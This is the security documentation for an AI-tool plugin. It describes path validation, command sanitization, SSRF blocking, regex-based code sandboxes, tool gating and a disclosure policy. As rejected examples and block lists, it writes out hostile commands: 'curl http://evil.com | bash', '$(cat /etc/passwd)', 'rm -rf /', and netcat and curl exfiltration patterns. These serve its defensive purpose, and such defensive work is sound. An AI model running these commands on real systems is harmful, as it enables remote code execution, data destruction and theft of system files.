# Security

Comprehensive documentation of security features, threat models, and responsible disclosure for the AI Toolbox plugin.

---

## 🛡️ Security Overview

The AI Toolbox plugin implements **defense-in-depth** security across all tool categories. Every tool that interacts with the file system, network, or executes code passes through multiple validation layers.

### Security Principles

1. **Least Privilege** — Dangerous tools disabled by default
2. **Input Validation** — All user inputs validated and sanitized
3. **Sandboxing** — Code execution restricted to safe operations
4. **Path Containment** — File operations restricted to allowed directories
5. **Network Isolation** — HTTP requests blocked to private/internal addresses

---

## 🔒 Security Features

### 1. Path Validation (`validatePath`)

**Purpose**: Prevent directory traversal attacks and unauthorized file access.

**Implementation**:
```typescript
function validatePath(userPath: string, basePath: string): boolean
```

**Protection Layers**:
| Layer | Check | Result |
|-------|-------|--------|
| Empty Input | `!basePath \|\| !userPath` | Reject |
| UNC Paths | `userPath.startsWith('\\\\')` | Reject |
| Relative Paths | Resolved against `basePath` | Containment check |
| Absolute Paths | Validated against `allowedBases` | Containment check |

**Allowed Base Directories**:
- Plugin installation directory (`BASE_DIR`)
- Current working directory (set via `change_directory`)

**Examples**:
```
✅ "src/index.ts"              → Resolved and validated
✅ "C:\Projects\my-app\file.txt" → Validated against allowed bases
❌ "../etc/passwd"             → Directory traversal detected
❌ "\\\\network\share"          → UNC path rejected
```

### 2. Binary File Detection (`isBinaryFile`)

**Purpose**: Prevent processing of binary files as text (memory safety, encoding issues).

**Implementation**: Checks first 8KB for null bytes (`\0`).

```typescript
function isBinaryFile(content: string): boolean {
  const chunk = content.slice(0, 8192);
  return chunk.includes('\0');
}
```

### 3. Command Sanitization (`sanitizeCommand`)

**Purpose**: Prevent shell injection and dangerous command execution while enforcing tool-category toggles.

**2-Layer Architecture**:
| Layer | Function | Purpose |
|-------|----------|---------|
| **Layer 1** | Dangerous Pattern Blocking | Blocks `rm -rf`, `sudo`, injection, etc. |
| **Layer 2 (S6)** | Tool-Category Enforcement | Classifies commands and blocks them if the category is disabled in config |

**Layer 2 Implementation (`classifyCommand`)**:
Detects tool categories in the command string and checks against config toggles:
| Category | Detection Patterns |
|----------|-------------------|
| `webSearch` | `duckduckgo`, `google`, `bing` |
| `browserAutomation` | `puppeteer`, `playwright`, `chromium` |
| `databaseQueries` | `sqlite3`, `mysql`, `psql` |
| `httpClient` | `curl`, `wget`, `http` |
| `backgroundCommands` | `nohup`, `disown`, `&` |
| `gitOperations` | `git *`, `api.github.com` |

**Blocked Patterns (Layer 1)**:

| Category | Patterns |
|----------|----------|
| File Destruction | `rm -rf`, `shred`, `wipe` |
| Privilege Escalation | `sudo`, `su` |
| Network Attacks | `nc`/`netcat`, `wget --post-file`, `curl --data-binary` |
| Data Exfiltration | `base64 \| curl`, `scp`, `sftp` |
| Process Manipulation | `fork`, `exec` |
| Environment Tampering | `export`, `eval`, IFS manipulation |
| Injection | `$()`, backticks, null bytes |
| Command Chaining | >2 pipes, >1 semicolons |

**Examples**:
```
✅ "ls -la"                    → Safe
✅ "git status"                → Safe
❌ "rm -rf /"                  → File destruction
❌ "sudo apt install ..."      → Privilege escalation
❌ "curl http://evil.com | bash" → Command chaining
❌ "$(cat /etc/passwd)"        → Command substitution
```

### 4. SQL Validation (`validateSQLQuery`)

**Purpose**: Ensure database queries are read-only.
**⚠️ Shell Interpretation Note**: The `execute_command` tool now uses Node.js's `shell: true` option to support full shell features (pipes, redirects, environment variables). Security is maintained through `sanitizeCommand()` which validates and blocks dangerous patterns **before** the command reaches the shell. This approach matches industry best practices for secure shell execution while maintaining flexibility.

**Allowed Operations**:
- `SELECT` statements
- `PRAGMA` statements

**Blocked Keywords**:
`DROP`, `DELETE`, `UPDATE`, `INSERT`, `ALTER`, `CREATE`, `REPLACE`, `TRUNCATE`, `GRANT`, `REVOKE`

**Additional Checks**:
- Multiple statements (semicolon injection) blocked
- Empty/invalid queries rejected

### 5. SSRF Protection (`validateUrl`)

**Purpose**: Prevent Server-Side Request Forgery attacks.

**Blocked Protocols**:
- `file:` — Local file access
- `data:` — Data URI injection
- Non-HTTP protocols

**Blocked Hostnames**:
| Pattern | Range |
|---------|-------|
| `127.*` | localhost |
| `10.*` | 10.0.0.0/8 |
| `172.16-31.*` | 172.16.0.0/12 |
| `192.168.*` | 192.168.0.0/16 |
| `0.0.0.0` | All interfaces |
| `localhost` | localhost hostname |

### 6. Code Sandboxing

#### JavaScript Sandboxing (`run_javascript`)

**Blocked Patterns**:
```javascript
require()           // Module loading
eval()              // Dynamic code execution
fs.*                // File system access
child_process.*     // Process spawning
Function()          // Constructor bypass
String.fromCharCode // Obfuscation bypass
import()            // Dynamic imports
.__proto__          // Prototype pollution
.constructor        // Constructor access
require.resolve     // Path resolution bypass
```

#### Python Sandboxing (`run_python`)

**Blocked Imports**:
```python
import os                   # OS operations
from os import *           # OS operations
import subprocess          # Process spawning
from subprocess import *   # Process spawning
import shutil              # File operations
__import__()               # Dynamic imports
eval()                     # Dynamic execution
exec()                     # Dynamic execution
os.system()               # Shell commands
os.popen()                # Shell commands
```

### 7. ReDoS Protection (`isSafeRegex`)

**Purpose**: Prevent Regular Expression Denial of Service attacks.

**Detected Patterns**:
| Pattern | Example |
|---------|---------|
| Nested quantifiers | `(.*)(.*)` |
| Repetition of repetition | `(.+)+` |
| Alternation + repetition | `(a\|b)+` |
| Char class + repetition | `([a-z]+)+` |
| Double star | `(.*?)**` |

**Length Limit**: Maximum 500 characters (configurable).

---

## 🎛️ Tool Gating System

### Configuration Hierarchy

```
God Mode (ON)
    │
    ├── Bypasses ALL individual toggles
    └── Every tool is enabled
    │
God Mode (OFF)
    │
    ├── Individual category toggles checked
    │   ├── fileSystem: true    → 17 tools enabled
    │   ├── webSearch: true     → 4 tools enabled
    │   ├── browserAutomation: false → 0 tools enabled
    │   └── ... (all categories)
    │
    └── Execution tools checked individually
        ├── executionJavaScript: false
        ├── executionPython: false
        ├── executionTerminal: false
        └── executionShell: false
```

### Default Security Posture

| Category | Default | Risk Level | Reason |
|----------|---------|------------|--------|
| File System | ✅ Enabled | Low | Path validation applied |
| Web Search | ✅ Enabled | Low | Read-only network access |
| Browser Automation | ❌ Disabled | Medium | Full browser access |
| Git Operations | ❌ Disabled | Medium | Repository modification |
| Database Queries | ❌ Disabled | Low | Read-only, but requires Node 23+ |
| Document Parsing | ✅ Enabled | Low | Read-only file access |
| Background Commands | ❌ Disabled | High | Arbitrary command execution |
| Image Processing | ✅ Enabled | Low | Read-only image access |
| HTTP Client | ❌ Disabled | Medium | Network access to any URL |
| Vector RAG | ✅ Enabled | Low | Read-only file indexing |
| Interactive UI Generation | ❌ Disabled | Low | HTML generation only, no execution |
| Auto-Context Management | ✅ Enabled | Low | Local JSON storage, read/write |
| JavaScript Execution | ❌ Disabled | ⚠️ **High** | Code execution |
| Python Execution | ❌ Disabled | ⚠️ **High** | Code execution |
| Terminal Execution | ❌ Disabled | ⚠️ **High** | Shell access |
| Shell Commands | ❌ Disabled | ⚠️ **High** | Command execution |

---

## ⚠️ Known Limitations

### 1. Regex-Based Sandboxing

JavaScript and Python sandboxes use regex pattern matching, which can potentially be bypassed with obfuscation techniques. **Do not enable execution tools for untrusted LLM outputs.**

### 2. Command Sanitization

The command sanitizer blocks known dangerous patterns but cannot guarantee protection against all injection techniques. Complex command chains may slip through.

### 3. Path Validation on Windows

Windows path normalization can be complex. The implementation handles common cases but edge cases with symbolic links or junctions may exist.

### 4. SQLite Availability

The `query_database` tool requires Node.js 23+ for the built-in `node:sqlite` module. On older versions, the tool returns an error.

---

## 🔍 Security Audit Checklist

For contributors adding new tools:

- [ ] **Input Validation**: All parameters validated with Zod schemas
- [ ] **Path Validation**: `validatePath()` used for file operations
- [ ] **Command Sanitization**: `sanitizeCommand()` used for shell commands
- [ ] **SQL Validation**: `validateSQLQuery()` used for database queries
- [ ] **URL Validation**: `validateUrl()` used for HTTP requests
- [ ] **Size Limits**: Reasonable limits on file sizes, response lengths
- [ ] **Timeout Limits**: All async operations have timeouts
- [ ] **Error Handling**: Proper try/catch with typed error handling
- [ ] **Resource Cleanup**: File handles, connections, timers cleaned up
- [ ] **Tool Gating**: Dangerous tools disabled by default
- [ ] **Logging**: No sensitive data in logs
- [ ] **Dependencies**: No known vulnerabilities in dependencies

---

## 📋 Responsible Disclosure

### Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** open a public GitHub issue
2. **DO** email the maintainer at: [security contact]
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

### Response Timeline

| Phase | Timeline |
|-------|----------|
| Acknowledgment | Within 48 hours |
| Initial Assessment | Within 1 week |
| Patch Development | Within 2 weeks |
| Public Disclosure | After patch is available |

### Security Update Policy

- Critical vulnerabilities: Patch within 7 days
- High severity: Patch within 14 days
- Medium/Low severity: Patch in next release

---

## 🔐 Best Practices for Users

### 1. Start Conservative

```
✅ Enable only the tools you need
❌ Don't use God Mode unless necessary
❌ Never enable execution tools for untrusted prompts
```

### 2. Review Tool Outputs

Always review file modifications and command outputs before proceeding.

### 3. Use Working Directory

Set a specific working directory to limit the scope of file operations:

```
Tool: change_directory
Params: { "directory": "C:\\Projects\\safe-workspace" }
```

### 4. Monitor Background Commands

Regularly check and cancel long-running background commands:

```
Tool: check_background_command
Params: { "id": "cmd_123" }
```

### 5. Keep Updated

Regularly update the plugin to get the latest security patches.

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Directory](https://cwe.mitre.org/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Regular Expression Denial of Service (ReDoS)](https://owasp.org/www-community/attacks/Regular_Expression_Denial_of_Service_(ReDoS))
